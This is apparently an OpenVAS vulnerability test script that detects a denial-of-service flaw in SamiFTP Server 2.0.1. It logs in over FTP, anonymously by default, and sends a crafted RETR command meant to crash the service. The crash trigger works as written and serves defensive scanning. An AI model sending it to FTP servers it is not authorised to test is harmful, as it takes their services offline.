###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samiftp_retr_cmd_dos_vuln.nasl 9353 2018-04-06 07:14:20Z cfischer $
#
# SamiFTP Server 'RETR' Command Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow the remote attackers to cause
a denial of service.

Impact Level: Application";

tag_affected = "SamiFTP Server version 2.0.1";

tag_insight = "The flaw is due to an error while parsing RETR command, which can
be exploited to crash the FTP service by sending crafted data via 'RETR' command.";

tag_solution = "Upgrade to version 2.0.2 or later,
For updates refer to http://www.karjasoft.com/old.php";

tag_summary = "The host is running SamiFTP Server and is prone to denial of
service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803717");
  script_version("$Revision: 9353 $");
  script_bugtraq_id(60513);
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:14:20 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2013-06-13 15:16:51 +0530 (Thu, 13 Jun 2013)");
  script_name("SamiFTP Server 'RETR' Command Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/26133");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/windows/sami-ftp-server-201-retr-denial-of-service");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


##
## The script code starts here
##

include("ftp_func.inc");

samiPort = "";
banner = "";
soc1 = "";
soc2 = "";
ftplogin = "";
resp = "";

samiPort = get_kb_item("Services/ftp");
if(!samiPort){
  samiPort = 21;
}

## Check Port status
if(!get_port_state(samiPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:samiPort);
if("220 Features p a" >!< banner){
  exit(0);
}

## Get Username from KB, If not given use default Username
user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}

## Get Password from KB, If not given use default Password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = "anonymous";
}

flag = 0;

for(i=0; i<3 ; i++)
{
  ## Open the socket
  soc1 = open_sock_tcp(samiPort);

  ## Exit if it's not able to open socket first time
  if(!soc1 && flag == 0){
    exit(0);
  }

  ## Check Login is successful or not
  ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);

  ## Exit if it's not able to login first time
  if(!ftplogin && flag == 0){
    exit(0);
  }

  flag = 1;

  ## For the second time it's not able to open the socket or
  ## not able to login means server is crashed
  if (!ftplogin || !soc1)
  {
    security_message(samiPort);
    exit(0);
  }

  ## Send specially crafted RETR command
  send(socket:soc1, data:string("RETR \x41", '\r\n'));

  ## Close FTP Socket
  ftp_close(socket:soc1);
}

sleep(3);

## Server is crashed if not able to open the socket
## or not able to get the banner
soc2 = open_sock_tcp(samiPort);
if(!soc2)
{
  security_message(samiPort);
  exit(0);
}

resp = ftp_recv_line(socket:soc2);
if("220 Features p a" >!< resp)
{
  security_message(samiPort);
  exit(0);
}

## Close FTP Socket
ftp_close(socket:soc2);
